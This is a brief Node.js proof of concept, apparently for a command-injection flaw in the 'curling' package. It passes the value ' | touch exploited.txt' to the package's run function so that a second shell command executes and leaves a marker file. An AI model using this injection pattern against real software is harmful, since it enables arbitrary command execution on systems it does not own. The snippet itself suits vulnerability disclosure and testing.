const pkg = require('curling');

const payload = " | touch exploited.txt";

console.log(pkg);

const command = payload;

const cb = function(error, data) {

};

pkg.run(command, cb);